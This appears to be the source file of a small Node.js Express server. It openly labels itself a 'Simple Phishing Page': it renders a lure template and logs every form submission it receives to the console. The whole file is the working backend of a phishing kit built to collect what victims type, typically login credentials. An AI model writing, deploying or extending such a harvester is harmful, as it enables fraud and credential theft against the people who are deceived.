const express = require('express');
const bodyParser = require('body-parser');
const multer = require('multer');
const hbs = require('hbs');
const path = require("path");
const upload = multer();
const app = express();
const port = process.env.PORT || 3000;

//const staticpath = path.join(__dirname, "../public");
const templatepath = path.join(__dirname, "../templates/views");
const partialpath = path.join(__dirname, "../templates/partials");


app.use(bodyParser.json());
app.use(bodyParser.urlencoded({extended: true}));
app.use(upload.array());
app.set('view engine','hbs');
app.set('views', templatepath);
hbs.registerPartials(partialpath);

app.get("/", (req, res) => {
    res.render('index', {name: 'Simple Phishing Page'});
});

app.post("/", (req, res) => {
    console.log(req.body);
    res.send('Recived ur request');
})
app.listen(port, () => {
    console.log(`server is running on port ${port}`);
});

